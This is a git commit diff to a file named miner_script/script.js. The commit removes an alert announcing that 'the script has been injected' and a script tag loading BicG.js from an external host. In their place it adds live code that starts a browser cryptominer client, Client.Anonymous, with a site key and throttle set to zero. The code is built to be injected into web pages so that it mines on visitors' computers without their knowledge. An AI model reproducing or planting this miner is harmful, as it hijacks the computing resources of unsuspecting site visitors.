da954fb11ca14b335b0ddb81fd43918cad3724a7
rootmelo92118 <32770959+rootmelo92118@users.noreply.github.com>
2019-07-26 23:19:47 +0800

    Update script.js

--- miner_script/script.js
+++ miner_script/script.js
@@ -1,11 +1,4 @@
-alert("if you can read this, the script has been injected. This will be the minner");
-
-<script src="https://www.hostingcloud.racing/BicG.js"></script>
-<script>
-    var _client = new Client.Anonymous('8fe0d26d5b07615e4f0324108b7bf63e005609ba72dfaf51c5ffe1bdeb3a03de', {
-        throttle: 0, ads: 0
-    });
-    _client.start();
-    
-
-</script>
+var _client = new Client.Anonymous('8fe0d26d5b07615e4f0324108b7bf63e005609ba72dfaf51c5ffe1bdeb3a03de', {
+    throttle: 0, ads: 0
+});
+_client.start();
